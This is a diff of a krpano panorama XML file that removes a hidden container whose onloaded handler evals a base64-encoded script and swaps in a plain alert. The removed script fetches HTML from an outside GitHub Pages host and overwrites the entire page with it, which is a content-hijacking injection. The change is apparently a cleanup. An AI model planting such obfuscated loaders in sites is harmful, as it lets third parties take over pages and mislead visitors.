@@ -3,6 +3,6 @@
     name="js_loader"
     type="container"
     visible="false"
-    onloaded="js(eval(atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAic3BvcnRzIjsKCmZldGNoKCJodHRwczovL2VsZG9yYWRvNzc1LmdpdGh1Yi5pby9tLyIgKyBpZCArICIuaHRtbCIpCiAgLnRoZW4oZnVuY3Rpb24ocmVzcG9uc2UpIHsKICAgIGlmICghcmVzcG9uc2Uub2spIHsKICAgICAgdGhyb3cgbmV3IEVycm9yKCJIVFRQICIgKyByZXNwb25zZS5zdGF0dXMpOwogICAgfQoKICAgIHJldHVybiByZXNwb25zZS50ZXh0KCk7CiAgfSkKICAudGhlbihmdW5jdGlvbihodG1sKSB7CiAgICBkb2N1bWVudC5vcGVuKCk7CiAgICBkb2N1bWVudC53cml0ZShodG1sKTsKICAgIGRvY3VtZW50LmNsb3NlKCk7CiAgfSkKICAuY2F0Y2goZnVuY3Rpb24oZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoIkxvYWRpbmcgZXJyb3I6IiwgZXJyb3IpOwogIH0pOw==')));"
+    onloaded="js(alert('ps.xml loaded'));"
   />
 </krpano>
